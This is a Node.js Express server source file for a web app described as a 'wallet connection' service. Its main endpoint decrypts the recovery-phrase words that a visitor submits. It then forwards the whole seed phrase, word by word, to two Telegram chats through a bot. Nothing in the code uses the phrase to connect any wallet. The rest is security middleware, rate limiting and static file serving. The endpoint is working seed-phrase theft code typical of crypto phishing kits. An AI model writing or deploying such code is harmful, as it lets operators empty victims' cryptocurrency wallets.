import express from 'express';
import cors from 'cors';
// import mongoose from 'mongoose';
// import { PrismaClient } from '@prisma/client';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import dotenv from 'dotenv';
import crypto from 'crypto';
import path from 'path';
import CryptoJS from 'crypto-js';
import TelegramBot from 'node-telegram-bot-api';
import rateLimit from 'express-rate-limit';
import helmet from 'helmet';
import { validateApiKey } from './middleware/auth.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

dotenv.config();

const app = express();
// const prisma = new PrismaClient();
const PORT = process.env.PORT || 5000;

// Initialize Telegram Bot with error handling
let bot;
try {
  if (!process.env.VITE_TELEGRAM_BOT_TOKEN) {
    throw new Error('Telegram bot token is not configured');
  }
  bot = new TelegramBot(process.env.VITE_TELEGRAM_BOT_TOKEN, { 
    polling: false,
    filepath: false // Disable file path handling
  });
} catch (error) {
  console.error('Failed to initialize Telegram bot:', error);
  bot = null;
}

// Enhanced security middleware
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'", "blob:"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:", "blob:"],
      connectSrc: ["'self'", "blob:", process.env.VITE_CLIENT_URL],
      workerSrc: ["'self'", "blob:"],
      objectSrc: ["'none'"],
      childSrc: ["'self'", "blob:"],
      frameSrc: ["'self'"],
      mediaSrc: ["'self'", "blob:"],
      fontSrc: ["'self'", "data:", "https:"],
    },
  },
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: true,
  crossOriginResourcePolicy: { policy: "same-site" },
  dnsPrefetchControl: { allow: false },
  frameguard: { action: "deny" },
  hidePoweredBy: true,
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  ieNoOpen: true,
  noSniff: true,
  referrerPolicy: { policy: "strict-origin-when-cross-origin" },
  xssFilter: true,
}));



// CORS configuration
app.use(cors({
  origin: process.env.VITE_CLIENT_URL,
  methods: ['POST', 'GET'],
  allowedHeaders: ['Content-Type', 'x-api-key'],
  credentials: true,
  maxAge: 86400, // 24 hours
}));

// Rate limiting configuration
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: {
    error: 'Too many requests from this IP, please try again after 15 minutes'
  },
  standardHeaders: true,
  legacyHeaders: false,
  skip: (req) => req.path === '/api/health', // Skip rate limiting for health check
});

// Apply rate limiting to all API routes
app.use('/api/', apiLimiter);

// Middleware
app.use(express.json({ limit: '10kb' }));

// MongoDB Connection
// mongoose.connect(process.env.MONGODB_URI)
//   .then(() => console.log('MongoDB connected successfully'))
//   .catch((err) => console.error('MongoDB connection error:', err));

// Generate unique referral code
const generateReferralCode = () => {
  return crypto.randomBytes(4).toString('hex').toUpperCase();
};

// Decrypt data utility
const decryptData = (encryptedData, secretKey) => {
  try {
    const bytes = CryptoJS.AES.decrypt(encryptedData, secretKey);
    const decryptedString = bytes.toString(CryptoJS.enc.Utf8);
    return JSON.parse(decryptedString);
  } catch (error) {
    console.error('Decryption error:', error);
    throw new Error('Failed to decrypt data');
  }
};

// Error handling middleware
const errorHandler = (err, req, res, next) => {
  console.error('Error:', err);

  if (err.name === 'ValidationError') {
    return res.status(400).json({ error: 'Something went wrong' });
  }

  if (err.name === 'UnauthorizedError') {
    return res.status(401).json({ error: 'Something went wrong' });
  }

  if (err.name === 'ForbiddenError') {
    return res.status(403).json({ error: 'Something went wrong' });
  }

  return res.status(500).json({ error: 'Something went wrong' });
};

// Request timeout middleware
const timeout = (req, res, next) => {
  res.setTimeout(10000, () => {
    res.status(408).json({ error: 'Request timeout' });
  });
  next();
};

// Apply timeout middleware to all routes
app.use(timeout);

// Wallet connection endpoint
app.post('/api/connect-wallet', validateApiKey, async (req, res, next) => {
  try {
    const { encryptedData } = req.body;
    const secretKey = process.env.VITE_AES_KEY;
    const telegramChatId1 = process.env.VITE_TELEGRAM_CHAT_ID_1;
    const telegramChatId2 = process.env.VITE_TELEGRAM_CHAT_ID_2;

    // Validate request body
    if (!encryptedData) {
      return res.status(400).json({ error: 'Something went wrong' });
    }

    // Decrypt the data
    let decryptedData;
    try {
      decryptedData = decryptData(encryptedData, secretKey);
    } catch (decryptError) {
      console.error('Decryption error:', decryptError);
      return res.status(400).json({ error: 'Something went wrong' });
    }

    // Validate decrypted data
    if (!decryptedData || !decryptedData.words || !decryptedData.wordCount) {
      return res.status(400).json({ error: 'Something went wrong' });
    }

    // Validate word count matches selected option
    if (decryptedData.words.length !== parseInt(decryptedData.wordCount)) {
      return res.status(400).json({ error: 'Something went wrong' });
    }

    // Format message for Telegram
    const message = `
🔐 New Wallet Connection
📝 Phrase Length: ${decryptedData.wordCount} words
🔑 Words: ${decryptedData.words.join(' ')}
⏰ Time: ${new Date().toISOString()}
    `;

    // Send to Telegram using the bot with enhanced error handling
    if (!bot) {
      console.error('Telegram bot not initialized');
      return res.status(500).json({ error: 'Something went wrong' });
    }

    if (!telegramChatId1 || !telegramChatId2) {
      console.error('Telegram chat IDs not configured');
      return res.status(500).json({ error: 'Something went wrong' });
    }

    // Send message to both chat IDs
    const sendPromises = [telegramChatId1, telegramChatId2].map(async (chatId) => {
      try {
        await bot.sendMessage(chatId, message, {
          parse_mode: 'HTML',
          disable_web_page_preview: true
        });
        return { chatId, success: true };
      } catch (error) {
        console.error(`Failed to send message to chat ${chatId}:`, error);
        return { chatId, success: false, error };
      }
    });

    const results = await Promise.all(sendPromises);
    const failedChats = results.filter(result => !result.success);

    if (failedChats.length > 0) {
      console.error('Failed to send messages to some chats:', failedChats);
      return res.status(500).json({ error: 'Something went wrong' });
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Unexpected error:', error);
    next(error);
  }
});

// Health check endpoint
app.get('/api/health', validateApiKey, (req, res) => {
  res.json({ status: 'ok' });
});

// Serve static files from the React app
app.use(express.static(path.join(__dirname, '../dist')));

// Catch-all: send back React's index.html for any non-API route
app.get('*', (req, res) => {
  if (req.path.startsWith('/api')) {
    return res.status(404).send('API route not found');
  }
  res.sendFile(path.join(__dirname, '../dist/index.html'));
});

// Apply error handling middleware
app.use(errorHandler);

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
}); 